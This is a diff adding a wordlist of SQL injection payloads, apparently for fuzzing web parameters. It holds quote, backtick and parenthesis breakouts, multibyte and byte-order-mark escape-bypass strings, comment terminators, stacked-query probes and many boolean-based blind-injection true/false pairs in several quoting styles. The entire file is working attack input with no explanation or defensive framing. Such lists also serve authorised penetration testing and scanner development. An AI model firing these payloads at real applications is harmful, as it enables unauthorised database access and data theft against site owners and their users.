@@ -1,0 +1,1292 @@
+'
+''
+'
+'--
+'
+'#
+'
+'||'
+'
+'*'
+'
+'-'
+'
+'^'
+'
+'&'
+'
+\'
+'
+','
+'
+'.'
+'
+' OR '
+'
+' OR ''-'
+'
+' OR '' '
+'
+' OR ''&'
+'
+' OR ''^'
+'
+' OR ''*'
+'
+'/*
+'
+%'
+'
+'%00
+'
+'=' 'or' AND '=' 'or'
+'
+' --
+'
+' #
+\
+'#
+\
+'-- -
+\
+' OR '
+\
+\\
+\
+\\'#
+\
+\\'-- -'
+1%bf%5c'
+1%bf%5c''
+1%bf%5c'
+1%bf%5c'-- -
+1%bf%5c'
+1%bf%5c'#
+1%af%5c'
+1%af%5c''
+1%af%5c'
+1%af%5c'-- -
+1%af%5c'
+1%af%5c'#
+1%af%5c'
+1%af%5c'%00
+0xbf27
+0xbf27'
+縗'
+縗' OR '
+縗'
+縗'-- -
+縗'
+縗'#
+圭'
+圭''
+圭'
+圭'#
+圭'
+圭'-- -
+0x8c5c
+0x8c5c'
+\xa3\x27
+\xa3\x27\x27
+\xa3\x27
+\xa3\x27-- -
+\xa3\x27
+\xa3\x27#
+0xbf5c27
+0xbf5c27c27
+0xbf5c27
+0xbf5c27-- -
+0xbf5c27
+0xbf5c27#
+0xbf5c27
+0xbf5c27%00
+ï»¿'
+ï»¿''
+ï»¿\'
+ï»¿\'-- -
+ï»¿\'
+ï»¿\'#
+ï»¿\
+ï»¿
+ï»¿\'
+ï»¿\' OR '
+*
+*|
+*
+*/*
+/
+//*
+'
+';
+'
+';-- -
+'
+';%00
+'
+', select 1-- -
+'
+','
+'
+',@variable
+'
+'||'URL_HTTP.REQUEST
+`
+``
+`
+`--
+`
+`#
+`
+`||`
+`
+`*`
+`
+`-`
+`
+`^`
+`
+`&`
+`
+\`
+`
+`,`
+`
+`.`
+`
+` OR `
+`
+` OR ``-`
+`
+` OR `` `
+`
+` OR ``&`
+`
+` OR ``^`
+`
+` OR ``*`
+`
+`/*
+`
+%`
+`
+`%00
+`
+`=` `or` AND `=` `or`
+`
+` --
+`
+` #
+\
+`#
+\
+`-- -
+\
+` OR `
+\
+\\
+\
+\\`#
+\
+\\`-- -`
+1%bf%5c`
+1%bf%5c``
+1%bf%5c`
+1%bf%5c`-- -
+1%bf%5c`
+1%bf%5c`#
+1%af%5c`
+1%af%5c``
+1%af%5c`
+1%af%5c`-- -
+1%af%5c`
+1%af%5c`#
+1%af%5c`
+1%af%5c`%00
+0xbf27
+0xbf27`
+縗`
+縗` OR `
+縗`
+縗`-- -
+縗`
+縗`#
+圭`
+圭``
+圭`
+圭`#
+圭`
+圭`-- -
+0x8c5c
+0x8c5c`
+\xa3\x27
+\xa3\x27\x27
+\xa3\x27
+\xa3\x27-- -
+\xa3\x27
+\xa3\x27#
+0xbf5c27
+0xbf5c27c27
+0xbf5c27
+0xbf5c27-- -
+0xbf5c27
+0xbf5c27#
+0xbf5c27
+0xbf5c27%00
+ï»¿`
+ï»¿``
+ï»¿\`
+ï»¿\`-- -
+ï»¿\`
+ï»¿\`#
+ï»¿\
+ï»¿
+ï»¿\`
+ï»¿\` OR `
+*
+*|
+*
+*/*
+/
+//*
+`
+`;
+`
+`;-- -
+`
+`;%00
+`
+`, select 1-- -
+`
+`,`
+`
+`,@variable
+`
+`||`URL_HTTP.REQUEST
+"
+""
+"
+"--
+"
+"#
+"
+"||"
+"
+"*"
+"
+"-"
+"
+"^"
+"
+"&"
+"
+\"
+"
+","
+"
+"."
+"
+" OR "
+"
+" OR ""-"
+"
+" OR "" "
+"
+" OR ""&"
+"
+" OR ""^"
+"
+" OR ""*"
+"
+"/*
+"
+%"
+"
+"%00
+"
+"=" "or" AND "=" "or"
+"
+" --
+"
+" #
+\
+"#
+\
+"-- -
+\
+" OR "
+\
+\\
+\
+\\"#
+\
+\\"-- -"
+1%bf%5c"
+1%bf%5c""
+1%bf%5c"-- -
+1%bf%5c"
+1%bf%5c"#
+1%af%5c"
+1%af%5c""
+1%af%5c"
+1%af%5c"-- -
+1%af%5c"
+1%af%5c"#
+1%af%5c"
+1%af%5c"%00
+0xbf27
+0xbf27"
+縗"
+縗" OR "
+縗"
+縗"-- -
+縗"
+縗"#
+圭"
+圭""
+圭"
+圭"#
+圭"
+圭"-- -
+0x8c5c
+0x8c5c"
+\xa3\x27
+\xa3\x27\x27
+\xa3\x27
+\xa3\x27-- -
+\xa3\x27
+\xa3\x27#
+0xbf5c27
+0xbf5c27c27
+0xbf5c27
+0xbf5c27-- -
+0xbf5c27
+0xbf5c27#
+0xbf5c27
+0xbf5c27%00
+ï»¿"
+ï»¿""
+ï»¿\"
+ï»¿\"-- -
+ï»¿\"
+ï»¿\"#
+ï»¿\
+ï»¿
+ï»¿\"
+ï»¿\" OR "
+*
+*|
+*
+*/*
+/
+//*
+"
+";
+"
+";-- -
+"
+";%00
+"
+", select 1-- -
+"
+","
+"
+",@variable
+"
+"||"URL_HTTP.REQUEST
+# Parenthesis + single quotes
+')
+')('
+')
+')--
+')
+')#
+')
+')||('
+')
+')*('
+')
+')-('
+')
+')^('
+')
+')&('
+')
+\')
+')
+'),('
+')
+').('
+')
+') OR ('
+')
+') OR ''-('
+')
+') OR ('') ('
+')
+') OR ''&('
+')
+') OR ''^('
+')
+') OR '*'('
+')
+')/*
+')
+%')
+')
+')%00
+')
+')=' 'or' AND '=' 'or('
+')
+') --
+')
+') #
+\)
+')#
+\)
+')-- -
+\)
+') OR ('
+\)
+\\)
+\)
+\\')#
+\)
+\\')-- -('
+1%bf%5c')
+1%bf%5c')('
+1%bf%5c')-- -
+1%bf%5c')
+1%bf%5c')#
+1%af%5c')
+1%af%5c')('
+1%af%5c')
+1%af%5c')-- -
+1%af%5c')
+1%af%5c')#
+1%af%5c')
+1%af%5c')%00
+0xbf27)
+0xbf2727)
+縗')'
+縗') OR ('
+縗')
+縗')-- -
+縗')
+縗')#
+圭')
+圭')('
+圭')
+圭')#
+圭')
+圭')-- -
+0x8c5c)
+0x8c5c')
+\xa3\x27)
+\xa3\x27\x27)
+\xa3\x27)
+\xa3\x27)-- -
+\xa3\x27)
+\xa3\x27)#
+0xbf5c27)
+0xbf5c27c27)
+0xbf5c27)
+0xbf5c27)-- -
+0xbf5c27)
+0xbf5c27)#
+0xbf5c27)
+0xbf5c27)%00
+ï»¿')
+ï»¿')('
+ï»¿\')
+ï»¿\')-- -
+ï»¿\')
+ï»¿\')#
+ï»¿\)
+ï»¿)
+ï»¿\')
+ï»¿\') OR ('
+*)
+*|)
+*)
+*/*)
+/)
+//*)
+')
+');
+')
+');-- -
+')
+');%00
+')
+'), select 1-- -
+')
+'),('
+')
+'),@variable
+')
+')||('URL_HTTP.REQUEST
+")
+")("
+")
+")--
+")
+")#
+")
+")||("
+")
+")*("
+")
+")-("
+")
+")^("
+")
+")&("
+")
+\")
+")
+"),("
+")
+").("
+")
+") OR ("
+")
+") OR ""-("
+")
+") OR ("") ("
+")
+") OR ""&("
+")
+") OR ""^("
+")
+") OR "*"("
+")
+")/*
+")
+%")
+")
+")%00
+")
+")=" "or" AND "=" "or("
+")
+") --
+")
+") #
+\)
+")#
+\)
+")-- -
+\)
+") OR ("
+\)
+\\)
+\)
+\\")#
+\)
+\\")-- -("
+1%bf%5c")
+1%bf%5c")("
+1%bf%5c")-- -
+1%bf%5c")
+1%bf%5c")#
+1%af%5c")
+1%af%5c")("
+1%af%5c")
+1%af%5c")-- -
+1%af%5c")
+1%af%5c")#
+1%af%5c")
+1%af%5c")%00
+0xbf27)
+0xbf2727)
+縗")"
+縗") OR ("
+縗")
+縗")-- -
+縗")
+縗")#
+圭")
+圭")("
+圭")
+圭")#
+圭")
+圭")-- -
+0x8c5c)
+0x8c5c")
+\xa3\x27)
+\xa3\x27\x27)
+\xa3\x27)
+\xa3\x27)-- -
+\xa3\x27)
+\xa3\x27)#
+0xbf5c27)
+0xbf5c27c27)
+0xbf5c27)
+0xbf5c27)-- -
+0xbf5c27)
+0xbf5c27)#
+0xbf5c27)
+0xbf5c27)%00
+ï»¿")
+ï»¿")("
+ï»¿\")
+ï»¿\")-- -
+ï»¿\")
+ï»¿\")#
+ï»¿\)
+ï»¿)
+ï»¿\")
+ï»¿\") OR ("
+*)
+*|)
+*)
+*/*)
+/)
+//*)
+")
+");
+")
+");-- -
+")
+");%00
+")
+"), select 1-- -
+")
+"),("
+")
+"),@variable
+")
+")||("URL_HTTP.REQUEST
+#BLIND SQLI
+#INT NO QUOTES
+ AND 1337=1337
+ AND 1337=1338
+ AND 1338 > 1337
+ AND 1337 > 1338
+ AND true=true
+ AND true=false
+ AND true=true-- -
+ AND true=false-- -
+ AND true=true#
+ AND true=false#
+ AND true=true%00
+ AND true=false%00
+ AND 1337=1337-- -
+ AND 1337=1338-- -
+ AND 1338 > 1337-- -
+ AND 1338 < 1337-- -
+ AND 1337=1337#
+ AND 1337=1338#
+ AND 1338 > 1337#
+ AND 1338 < 1337#
+ AND 1337=1337/*
+ AND 1337=1338/*
+ AND 1338 > 1337/*
+ AND 1338 < 1337/*
+ AND 1338 > 1337%00
+ AND 1338 < 1337%00
+ AND 1338=1337%00
+ AND 1338=1337%00
+ AND 1 IN 1337
+ AND 1 NOT IN 1337
+ AND 1 IN 1337-- -
+ AND 1 NOT IN 1337-- -
+ HAVING 1337=1337
+ HAVING 1337=1338
+ HAVING 1337=1337-- -
+ HAVING 1337=1338-- -
+ HAVING 1337=1337#
+ HAVING 1337=1338#
+ AND 2 BETWEEN 1 AND 3
+ AND 2 BETWEEN 1 AND 3
+%'
+%''
+' AND '1337'='1337
+' AND '1337'='1338
+' AND '1337vnhacker'='1337vnhacker
+' AND '1337vnhacker'='1338vnhacker
+' AND 'a' < 'asdf
+' AND 'a' > 'asdf
+' AND 'a' IN 'asdf
+' AND 'a' NOT IN 'asdf
+' HAVING '1337'='1337
+' HAVING '1338'='1337
+\' AND '1337'='1337
+\' AND '1337'='1338
+\' AND '1337vnhacker'='1337vnhacker
+\' AND '1337vnhacker'='1338vnhacker
+\' AND 'a' < 'asdf
+\' AND 'a' > 'asdf
+\' AND 'a' IN 'asdf
+\' AND 'a' NOT IN 'asdf
+\' HAVING '1337'='1337
+\' HAVING '1338'='1337
+' AND 2 BETWEEN 1 AND 3 AND ' 
+' AND 2 BETWEEN 1 AND 0 AND '
+' AND 2 BETWEEN 1 AND 3
+' AND 2 BETWEEN 1 AND 0
+' AND '1337'='1337'-- -
+' AND '1337'='1338'-- -
+' AND '1337vnhacker'='1337vnhacker'-- -
+' AND '1337vnhacker'='1338vnhacker'-- -
+' AND 'a' < 'asdf'-- -
+' AND 'a' > 'asdf'-- -
+' AND 'a' IN 'asdf'-- -
+' AND 'a' NOT IN 'asdf'-- -
+' HAVING '1337'='1337'-- -
+' HAVING '1338'='1337'-- -
+\' AND '1337'='1337'-- -
+\' AND '1337'='1338'-- -
+\' AND '1337vnhacker'='1337vnhacker'-- -
+\' AND '1337vnhacker'='1338vnhacker'-- -
+\' AND 'a' < 'asdf'-- -
+\' AND 'a' > 'asdf'-- -
+\' AND 'a' IN 'asdf'-- -
+\' AND 'a' NOT IN 'asdf'-- -
+\' HAVING '1337'='1337'-- -
+\' HAVING '1338'='1337'-- -
+' AND '1337'='1337'#
+' AND '1337'='1338'#
+' AND '1337vnhacker'='1337vnhacker'#
+' AND '1337vnhacker'='1338vnhacker'#
+' AND 'a' < 'asdf'#
+' AND 'a' > 'asdf'#
+' AND 'a' IN 'asdf'#
+' AND 'a' NOT IN 'asdf'#
+' HAVING '1337'='1337'#
+' HAVING '1338'='1337'#
+\' AND '1337'='1337'#
+\' AND '1337'='1338'#
+\' AND '1337vnhacker'='1337vnhacker'#
+\' AND '1337vnhacker'='1338vnhacker'#
+\' AND 'a' < 'asdf'#
+\' AND 'a' > 'asdf'#
+\' AND 'a' IN 'asdf'#
+\' AND 'a' NOT IN 'asdf'#
+\' HAVING '1337'='1337'#
+\' HAVING '1338'='1337'#
+' AND '1337'='1337'%00
+' AND '1337'='1338'%00
+' AND '1337vnhacker'='1337vnhacker'%00
+' AND '1337vnhacker'='1338vnhacker'%00
+' AND 'a' < 'asdf'%00
+' AND 'a' > 'asdf'%00
+' AND 'a' IN 'asdf'%00
+' AND 'a' NOT IN 'asdf'%00
+' HAVING '1337'='1337'%00
+' HAVING '1338'='1337'%00
+\' AND '1337'='1337'%00
+\' AND '1337'='1338'%00
+\' AND '1337vnhacker'='1337vnhacker'%00
+\' AND '1337vnhacker'='1338vnhacker'%00
+\' AND 'a' < 'asdf'%00
+\' AND 'a' > 'asdf'%00
+\' AND 'a' IN 'asdf'%00
+\' AND 'a' NOT IN 'asdf'%00
+\' HAVING '1337'='1337'%00
+\' HAVING '1338'='1337'%00
+' AND '1337'='1337/*
+' AND '1337'='1338/*
+' AND '1337vnhacker'='1337vnhacker'/*
+' AND '1337vnhacker'='1338vnhacker'/*
+' AND 'a' < 'asdf'/*
+' AND 'a' > 'asdf'/*
+' AND 'a' IN 'asdf'/*
+' AND 'a' NOT IN 'asdf'/*
+' HAVING '1337'='1337'/*
+' HAVING '1338'='1337'/*
+\' AND '1337'='1337'/*
+\' AND '1337'='1338'/*
+\' AND '1337vnhacker'='1337vnhacker'/*
+\' AND '1337vnhacker'='1338vnhacker'/*
+\' AND 'a' < 'asdf'/*
+\' AND 'a' > 'asdf'/*
+\' AND 'a' IN 'asdf'/*
+\' AND 'a' NOT IN 'asdf'/*
+\' HAVING '1337'='1337'/*
+\' HAVING '1338'='1337'/*
+
+#BLIND Double QUOTES
+
+%"
+%""
+" AND "1337"="1337
+" AND "1337"="1338
+" AND "1337vnhacker"="1337vnhacker
+" AND "1337vnhacker"="1338vnhacker
+" AND "a" < "asdf
+" AND "a" > "asdf
+" AND "a" IN "asdf
+" AND "a" NOT IN "asdf
+" HAVING "1337"="1337
+" HAVING "1338"="1337
+\" AND "1337"="1337
+\" AND "1337"="1338
+\" AND "1337vnhacker"="1337vnhacker
+\" AND "1337vnhacker"="1338vnhacker
+\" AND "a" < "asdf
+\" AND "a" > "asdf
+\" AND "a" IN "asdf
+\" AND "a" NOT IN "asdf
+\" HAVING "1337"="1337
+\" HAVING "1338"="1337
+" AND 2 BETWEEN 1 AND 3 AND " 
+" AND 2 BETWEEN 1 AND 0 AND "
+" AND 2 BETWEEN 1 AND 3
+" AND 2 BETWEEN 1 AND 0
+" AND "1337"="1337"-- -
+" AND "1337"="1338"-- -
+" AND "1337vnhacker"="1337vnhacker"-- -
+" AND "1337vnhacker"="1338vnhacker"-- -
+" AND "a" < "asdf"-- -
+" AND "a" > "asdf"-- -
+" AND "a" IN "asdf"-- -
+" AND "a" NOT IN "asdf"-- -
+" HAVING "1337"="1337"-- -
+" HAVING "1338"="1337"-- -
+\" AND "1337"="1337"-- -
+\" AND "1337"="1338"-- -
+\" AND "1337vnhacker"="1337vnhacker"-- -
+\" AND "1337vnhacker"="1338vnhacker"-- -
+\" AND "a" < "asdf"-- -
+\" AND "a" > "asdf"-- -
+\" AND "a" IN "asdf"-- -
+\" AND "a" NOT IN "asdf"-- -
+\" HAVING "1337"="1337"-- -
+\" HAVING "1338"="1337"-- -
+" AND "1337"="1337"#
+" AND "1337"="1338"#
+" AND "1337vnhacker"="1337vnhacker"#
+" AND "1337vnhacker"="1338vnhacker"#
+" AND "a" < "asdf"#
+" AND "a" > "asdf"#
+" AND "a" IN "asdf"#
+" AND "a" NOT IN "asdf"#
+" HAVING "1337"="1337"#
+" HAVING "1338"="1337"#
+\" AND "1337"="1337"#
+\" AND "1337"="1338"#
+\" AND "1337vnhacker"="1337vnhacker"#
+\" AND "1337vnhacker"="1338vnhacker"#
+\" AND "a" < "asdf"#
+\" AND "a" > "asdf"#
+\" AND "a" IN "asdf"#
+\" AND "a" NOT IN "asdf"#
+\" HAVING "1337"="1337"#
+\" HAVING "1338"="1337"#
+" AND "1337"="1337"%00
+" AND "1337"="1338"%00
+" AND "1337vnhacker"="1337vnhacker"%00
+" AND "1337vnhacker"="1338vnhacker"%00
+" AND "a" < "asdf"%00
+" AND "a" > "asdf"%00
+" AND "a" IN "asdf"%00
+" AND "a" NOT IN "asdf"%00
+" HAVING "1337"="1337"%00
+" HAVING "1338"="1337"%00
+\" AND "1337"="1337"%00
+\" AND "1337"="1338"%00
+\" AND "1337vnhacker"="1337vnhacker"%00
+\" AND "1337vnhacker"="1338vnhacker"%00
+\" AND "a" < "asdf"%00
+\" AND "a" > "asdf"%00
+\" AND "a" IN "asdf"%00
+\" AND "a" NOT IN "asdf"%00
+\" HAVING "1337"="1337"%00
+\" HAVING "1338"="1337"%00
+" AND "1337"="1337/*
+" AND "1337"="1338/*
+" AND "1337vnhacker"="1337vnhacker"/*
+" AND "1337vnhacker"="1338vnhacker"/*
+" AND "a" < "asdf"/*
+" AND "a" > "asdf"/*
+" AND "a" IN "asdf"/*
+" AND "a" NOT IN "asdf"/*
+" HAVING "1337"="1337"/*
+" HAVING "1338"="1337"/*
+\" AND "1337"="1337"/*
+\" AND "1337"="1338"/*
+\" AND "1337vnhacker"="1337vnhacker"/*
+\" AND "1337vnhacker"="1338vnhacker"/*
+\" AND "a" < "asdf"/*
+\" AND "a" > "asdf"/*
+\" AND "a" IN "asdf"/*
+\" AND "a" NOT IN "asdf"/*
+\" HAVING "1337"="1337"/*
+\" HAVING "1338"="1337"/*
+
+#BLIND SQLi parenthis
+
+%')
+%')('
+') AND '1337'=('1337
+') AND '1337'=('1338
+') AND ('1337vnhacker')=('1337vnhacker
+') AND ('1337vnhacker')=('1338vnhacker
+') AND ('a') < ('asdf
+') AND ('a') > ('asdf
+') AND ('a') IN ('asdf
+') AND ('a') NOT IN ('asdf
+') HAVING ('1337')=('1337
+') HAVING ('1338')=('1337
+\') AND ('1337')=('1337
+\') AND ('1337')=('1338
+\') AND ('1337vnhacker')=('1337vnhacker
+\') AND ('1337vnhacker')=('1338vnhacker
+\') AND ('a') < ('asdf
+\') AND ('a') > ('asdf
+\') AND ('a') IN ('asdf
+\') AND ('a') NOT IN ('asdf
+\') HAVING ('1337')=('1337
+\') HAVING ('1338')=('1337
+') AND 2 BETWEEN 1 AND 3 AND (' 
+') AND 2 BETWEEN 1 AND 0 AND ('
+') AND 2 BETWEEN 1 AND 3
+') AND 2 BETWEEN 1 AND 0
+') AND ('1337'='1337
+') AND ('1337'='1338
+') AND ('1337vnhacker'='1337vnhacker
+') AND ('1337vnhacker'='1338vnhacker
+') AND ('a' < 'asdf
+') AND ('a' > 'asdf
+') AND ('a' IN 'asdf
+') AND ('a' NOT IN 'asdf
+') HAVING ('1337'='1337
+') HAVING ('1338'='1337
+\') AND ('1337'='1337
+\') AND ('1337'='1338
+\') AND ('1337vnhacker'='1337vnhacker
+\') AND ('1337vnhacker'='1338vnhacker
+') AND ('1337')=('1337')-- -
+') AND ('1337')=('1338')-- -
+') AND ('1337vnhacker')=('1337vnhacker')-- -
+') AND ('1337vnhacker')=('1338vnhacker')-- -
+') AND ('a') < ('asdf')-- -
+') AND ('a') > ('asdf')-- -
+') AND ('a') IN ('asdf')-- -
+') AND ('a') NOT IN ('asdf')-- -
+') HAVING ')1337')=('1337')-- -
+') HAVING ('1338')=('1337')-- -
+\') AND ('1337')=('1337')-- -
+\') AND ('1337')=('1338')-- -
+\') AND ('1337vnhacker')=('1337vnhacker')-- -
+\') AND ('1337vnhacker')=('1338vnhacker')-- -
+\') AND ('a') < ('asdf')-- -
+\') AND ('a') > ('asdf')-- -
+\') AND ('a') IN ('asdf')-- -
+\') AND ('a') NOT IN ('asdf')-- -
+\') HAVING ('1337')=('1337')-- -
+\') HAVING ('1338')=('1337')-- -
+') AND ('1337'='1337')-- -
+') AND ('1337'='1338')-- -
+') AND ('1337vnhacker'='1337vnhacker')-- -
+') AND ('1337vnhacker'='1338vnhacker')-- -
+') AND ('a' < 'asdf')-- -
+') AND ('a' > 'asdf')-- -
+') AND ('a' IN 'asdf')-- -
+') AND ('a' NOT IN 'asdf')-- -
+') HAVING ('1337'='1337')-- -
+') HAVING ('1338'='1337')-- -
+\') AND ('1337'='1337')-- -
+\') AND ('1337'='1338')-- -
+\') AND ('1337vnhacker'='1337vnhacker')-- -
+\') AND ('1337vnhacker'='1338vnhacker')-- -
+') AND ('1337')=('1337')#
+') AND ('1337')=('1338')#
+') AND ('1337vnhacker')=('1337vnhacker')#
+') AND ('1337vnhacker')=('1338vnhacker')#
+') AND ('a') < ('asdf')#
+') AND ('a') > ('asdf')#
+') AND ('a') IN ('asdf')#
+') AND ('a') NOT IN ('asdf')#
+') HAVING ')1337')=('1337')#
+') HAVING ('1338')=('1337')#
+\') AND ('1337')=('1337')#
+\') AND ('1337')=('1338')#
+\') AND ('1337vnhacker')=('1337vnhacker')#
+\') AND ('1337vnhacker')=('1338vnhacker')#
+\') AND ('a') < ('asdf')#
+\') AND ('a') > ('asdf')#
+\') AND ('a') IN ('asdf')#
+\') AND ('a') NOT IN ('asdf')#
+\') HAVING ('1337')=('1337')#
+\') HAVING ('1338')=('1337')#
+') AND ('1337')=('1337')%00
+') AND ('1337')=('1338')%00
+') AND ('1337vnhacker')=('1337vnhacker')%00
+') AND ('1337vnhacker')=('1338vnhacker')%00
+') AND ('a') < ('asdf')%00
+') AND ('a') > ('asdf')%00
+') AND ('a') IN ('asdf')%00
+') AND ('a') NOT IN ('asdf')%00
+') HAVING ')1337')=('1337')%00
+') HAVING ('1338')=('1337')%00
+\') AND ('1337')=('1337')%00
+\') AND ('1337')=('1338')%00
+\') AND ('1337vnhacker')=('1337vnhacker')%00
+\') AND ('1337vnhacker')=('1338vnhacker')%00
+\') AND ('a') < ('asdf')%00
+\') AND ('a') > ('asdf')%00
+\') AND ('a') IN ('asdf')%00
+\') AND ('a') NOT IN ('asdf')%00
+\') HAVING ('1337')=('1337')%00
+\') HAVING ('1338')=('1337')%00
+') AND ('1337')=('1337')/*
+') AND ('1337')=('1338')/*
+') AND ('1337vnhacker')=('1337vnhacker')/*
+') AND ('1337vnhacker')=('1338vnhacker')/*
+') AND ('a') < ('asdf')/*
+') AND ('a') > ('asdf')/*
+') AND ('a') IN ('asdf')/*
+') AND ('a') NOT IN ('asdf')/*
+') HAVING ')1337')=('1337')/*
+') HAVING ('1338')=('1337')/*
+\') AND ('1337')=('1337')/*
+\') AND ('1337')=('1338')/*
+\') AND ('1337vnhacker')=('1337vnhacker')/*
+\') AND ('1337vnhacker')=('1338vnhacker')/*
+\') AND ('a') < ('asdf')/*
+\') AND ('a') > ('asdf')/*
+\') AND ('a') IN ('asdf')/*
+\') AND ('a') NOT IN ('asdf')/*
+\') HAVING ('1337')=('1337')/*
+\') HAVING ('1338')=('1337')/*
+%")
+%")("
+") AND "1337"=("1337
+") AND "1337"=("1338
+") AND ("1337vnhacker")=("1337vnhacker
+") AND ("1337vnhacker")=("1338vnhacker
+") AND ("a") < ("asdf
+") AND ("a") > ("asdf
+") AND ("a") IN ("asdf
+") AND ("a") NOT IN ("asdf
+") HAVING ("1337")=("1337
+") HAVING ("1338")=("1337
+\") AND ("1337")=("1337
+\") AND ("1337")=("1338
+\") AND ("1337vnhacker")=("1337vnhacker
+\") AND ("1337vnhacker")=("1338vnhacker
+\") AND ("a") < ("asdf
+\") AND ("a") > ("asdf
+\") AND ("a") IN ("asdf
+\") AND ("a") NOT IN ("asdf
+\") HAVING ("1337")=("1337
+\") HAVING ("1338")=("1337
+") AND 2 BETWEEN 1 AND 3 AND (" 
+") AND 2 BETWEEN 1 AND 0 AND ("
+") AND 2 BETWEEN 1 AND 3
+") AND 2 BETWEEN 1 AND 0
+") AND ("1337"="1337
+") AND ("1337"="1338
+") AND ("1337vnhacker"="1337vnhacker
+") AND ("1337vnhacker"="1338vnhacker
+") AND ("a" < "asdf
+") AND ("a" > "asdf
+") AND ("a" IN "asdf
+") AND ("a" NOT IN "asdf
+") HAVING ("1337"="1337
+") HAVING ("1338"="1337
+\") AND ("1337"="1337
+\") AND ("1337"="1338
+\") AND ("1337vnhacker"="1337vnhacker
+\") AND ("1337vnhacker"="1338vnhacker
+") AND ("1337")=("1337")-- -
+") AND ("1337")=("1338")-- -
+") AND ("1337vnhacker")=("1337vnhacker")-- -
+") AND ("1337vnhacker")=("1338vnhacker")-- -
+") AND ("a") < ("asdf")-- -
+") AND ("a") > ("asdf")-- -
+") AND ("a") IN ("asdf")-- -
+") AND ("a") NOT IN ("asdf")-- -
+") HAVING ("1337")=("1337")-- -
+") HAVING ("1338")=("1337")-- -
+\") AND ("1337")=("1337")-- -
+\") AND ("1337")=("1338")-- -
+\") AND ("1337vnhacker")=("1337vnhacker")-- -
+\") AND ("1337vnhacker")=("1338vnhacker")-- -
+\") AND ("a") < ("asdf")-- -
+\") AND ("a") > ("asdf")-- -
+\") AND ("a") IN ("asdf")-- -
+\") AND ("a") NOT IN ("asdf")-- -
+\") HAVING ("1337")=("1337")-- -
+\") HAVING ("1338")=("1337")-- -
+") AND ("1337"="1337")-- -
+") AND ("1337"="1338")-- -
+") AND ("1337vnhacker"="1337vnhacker")-- -
+") AND ("1337vnhacker"="1338vnhacker")-- -
+") AND ("a" < "asdf")-- -
+") AND ("a" > "asdf")-- -
+") AND ("a" IN "asdf")-- -
+") AND ("a" NOT IN "asdf")-- -
+") HAVING ("1337"="1337")-- -
+") HAVING ("1338"="1337")-- -
+\") AND ("1337"="1337")-- -
+\") AND ("1337"="1338")-- -
+\") AND ("1337vnhacker"="1337vnhacker")-- -
+\") AND ("1337vnhacker"="1338vnhacker")-- -
+") AND ("1337")=("1337")#
+") AND ("1337")=("1338")#
+") AND ("1337vnhacker")=("1337vnhacker")#
+") AND ("1337vnhacker")=("1338vnhacker")#
+") AND ("a") < ("asdf")#
+") AND ("a") > ("asdf")#
+") AND ("a") IN ("asdf")#
+") AND ("a") NOT IN ("asdf")#
+") HAVING ")1337")=("1337")#
+") HAVING ("1338")=("1337")#
+\") AND ("1337")=("1337")#
+\") AND ("1337")=("1338")#
+\") AND ("1337vnhacker")=("1337vnhacker")#
+\") AND ("1337vnhacker")=("1338vnhacker")#
+\") AND ("a") < ("asdf")#
+\") AND ("a") > ("asdf")#
+\") AND ("a") IN ("asdf")#
+\") AND ("a") NOT IN ("asdf")#
+\") HAVING ("1337")=("1337")#
+\") HAVING ("1338")=("1337")#
+") AND ("1337")=("1337")%00
+") AND ("1337")=("1338")%00
+") AND ("1337vnhacker")=("1337vnhacker")%00
+") AND ("1337vnhacker")=("1338vnhacker")%00
+") AND ("a") < ("asdf")%00
+") AND ("a") > ("asdf")%00
+") AND ("a") IN ("asdf")%00
+") AND ("a") NOT IN ("asdf")%00
+") HAVING ")1337")=("1337")%00
+") HAVING ("1338")=("1337")%00
+\") AND ("1337")=("1337")%00
+\") AND ("1337")=("1338")%00
+\") AND ("1337vnhacker")=("1337vnhacker")%00
+\") AND ("1337vnhacker")=("1338vnhacker")%00
+\") AND ("a") < ("asdf")%00
+\") AND ("a") > ("asdf")%00
+\") AND ("a") IN ("asdf")%00
+\") AND ("a") NOT IN ("asdf")%00
+\") HAVING ("1337")=("1337")%00
+\") HAVING ("1338")=("1337")%00
+") AND ("1337")=("1337")/*
+") AND ("1337")=("1338")/*
+") AND ("1337vnhacker")=("1337vnhacker")/*
+") AND ("1337vnhacker")=("1338vnhacker")/*
+") AND ("a") < ("asdf")/*
+") AND ("a") > ("asdf")/*
+") AND ("a") IN ("asdf")/*
+") AND ("a") NOT IN ("asdf")/*
+") HAVING ")1337")=("1337")/*
+") HAVING ("1338")=("1337")/*
+\") AND ("1337")=("1337")/*
+\") AND ("1337")=("1338")/*
+\") AND ("1337vnhacker")=("1337vnhacker")/*
+\") AND ("1337vnhacker")=("1338vnhacker")/*
+\") AND ("a") < ("asdf")/*
+\") AND ("a") > ("asdf")/*
+\") AND ("a") IN ("asdf")/*
+\") AND ("a") NOT IN ("asdf")/*
+\") HAVING ("1337")=("1337")/*
+\") HAVING ("1338")=("1337")/*
+%`
+%``
+` AND `1337`=`1337
+` AND `1337`=`1338
+` AND `1337vnhacker`=`1337vnhacker
+` AND `1337vnhacker`=`1338vnhacker
+` AND `a` < `asdf
+` AND `a` > `asdf
+` AND `a` IN `asdf
+` AND `a` NOT IN `asdf
+` HAVING `1337`=`1337
+` HAVING `1338`=`1337
+\` AND `1337`=`1337
+\` AND `1337`=`1338
+\` AND `1337vnhacker`=`1337vnhacker
+\` AND `1337vnhacker`=`1338vnhacker
+\` AND `a` < `asdf
+\` AND `a` > `asdf
+\` AND `a` IN `asdf
+\` AND `a` NOT IN `asdf
+\` HAVING `1337`=`1337
+\` HAVING `1338`=`1337
+` AND 2 BETWEEN 1 AND 3 AND ` 
+` AND 2 BETWEEN 1 AND 0 AND `
+` AND 2 BETWEEN 1 AND 3
+` AND 2 BETWEEN 1 AND 0
+` AND `1337`=`1337`-- -
+` AND `1337`=`1338`-- -
+` AND `1337vnhacker`=`1337vnhacker`-- -
+` AND `1337vnhacker`=`1338vnhacker`-- -
+` AND `a` < `asdf`-- -
+` AND `a` > `asdf`-- -
+` AND `a` IN `asdf`-- -
+` AND `a` NOT IN `asdf`-- -
+` HAVING `1337`=`1337`-- -
+` HAVING `1338`=`1337`-- -
+\` AND `1337`=`1337`-- -
+\` AND `1337`=`1338`-- -
+\` AND `1337vnhacker`=`1337vnhacker`-- -
+\` AND `1337vnhacker`=`1338vnhacker`-- -
+\` AND `a` < `asdf`-- -
+\` AND `a` > `asdf`-- -
+\` AND `a` IN `asdf`-- -
+\` AND `a` NOT IN `asdf`-- -
+\` HAVING `1337`=`1337`-- -
+\` HAVING `1338`=`1337`-- -
+` AND `1337`=`1337`#
+` AND `1337`=`1338`#
+` AND `1337vnhacker`=`1337vnhacker`#
